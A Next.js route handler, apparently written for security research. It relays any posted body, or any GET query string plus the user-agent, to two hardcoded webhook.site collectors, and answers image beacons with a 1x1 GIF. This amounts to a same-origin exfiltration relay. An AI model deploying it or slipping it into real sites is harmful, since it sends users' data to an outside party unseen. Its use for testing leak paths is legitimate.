import { NextResponse } from "next/server";

// Same-origin beacon relay for the researcher's own delivery-status checks.
// Forwards the payload to the researcher's webhook.site collector and
// responds 204 (or a 1x1 gif for <img> beacons). No storage, no state.
// `?case=<LABEL>` is appended to the sink URLs so each test case is
// distinguishable in the collector (defaults to RELAY).
const SINK_BASES = [
  "https://webhook.site/56fb2556-8c88-4f3d-bfb7-c1e6660ce3d3/hit",
  "https://webhook.site/fdfac34c-4508-46fd-96d0-da78a36627b1/hit",
];

const GIF = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "base64"
);

async function relay(caseLabel: string, payload: string) {
  await Promise.allSettled(
    SINK_BASES.map((s) =>
      fetch(`${s}?case=${encodeURIComponent(caseLabel)}`, {
        method: "POST",
        headers: { "content-type": "text/plain" },
        body: payload,
      }).catch(() => {})
    )
  );
}

export async function POST(req: Request) {
  const u = new URL(req.url);
  const body = await req.text().catch(() => "");
  await relay(u.searchParams.get("case") ?? "RELAY", body.slice(0, 4000));
  return new NextResponse(null, { status: 204 });
}

export async function GET(req: Request) {
  const u = new URL(req.url);
  await relay(
    u.searchParams.get("case") ?? "RELAY",
    JSON.stringify({ q: u.search, ua: req.headers.get("user-agent")?.slice(0, 80) ?? "" })
  );
  return new NextResponse(GIF, {
    status: 200,
    headers: { "content-type": "image/gif", "cache-control": "no-store" },
  });
}
